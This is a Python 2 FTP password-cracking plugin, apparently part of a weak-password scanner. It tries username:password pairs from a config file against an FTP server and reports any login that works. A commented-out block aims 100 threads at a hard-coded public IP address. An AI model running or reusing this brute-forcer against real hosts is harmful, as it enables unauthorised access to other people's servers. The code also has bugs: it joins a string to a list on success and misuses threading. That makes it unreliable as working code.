#coding=utf-8
import time
import threading
from multiprocessing.dummy import Pool
import socket
socket.setdefaulttimeout(88)
#from printers import printPink,printGreen
from ftplib import FTP

def ftp_connect(ip,username,password,port):
    crack=0
    try:
        ftp=FTP()
        ftp.connect(ip,str(port))
        ftp.login(user=username,passwd=password)
        crack=1
        ftp.close()
    except Exception,e:
        print "%s ftp service 's %s:%s login fail " %(ip,username,password)
        pass
    return crack
def check(host,port,time):
        results = []
        try:
            print "start crack ftp"
            d=open('plugins/conf/ftp.conf','r')
            data=d.readline().strip('\r\n')
            while(data):
                username=data.split(':')[0]
                password=data.split(':')[1]
                if ftp_connect(host,username,password,int(port))==1:
                    print("%s ftp at %s has weaken password!!-------%s:%s\r\n" %(host,port,username,password))
                    results.append("%s ftp at %s has weaken password!!-------%s:%s\r\n" %(host,port,username,password))
                    break
                data=d.readline().strip('\r\n')
        except Exception,e:
            print e
            pass
        if len(results) > 0:
            return 'YES|'+results
        else:
            return 'NO'



'''if __name__=="__main__":
    for i in range(100):
        t = threading.Thread(target=check('67.225.139.176',21,10), name=str(i))
        t.setDaemon(True)
        t.start()'''
